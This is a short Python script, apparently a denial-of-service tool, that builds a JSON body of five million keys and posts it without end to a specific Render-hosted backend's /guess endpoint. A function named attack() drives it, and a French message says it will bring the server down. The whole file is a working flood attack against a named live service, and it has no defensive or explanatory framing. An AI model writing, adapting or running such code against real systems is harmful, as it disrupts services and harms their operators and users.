import requests

payload = {str(i * 31): "val" for i in range(5000000)}

def attack():
    print("le serv en plss")
    while True:
        requests.post("https://saint-valentin-backend-tyqw.onrender.com/guess", json=payload)

attack()
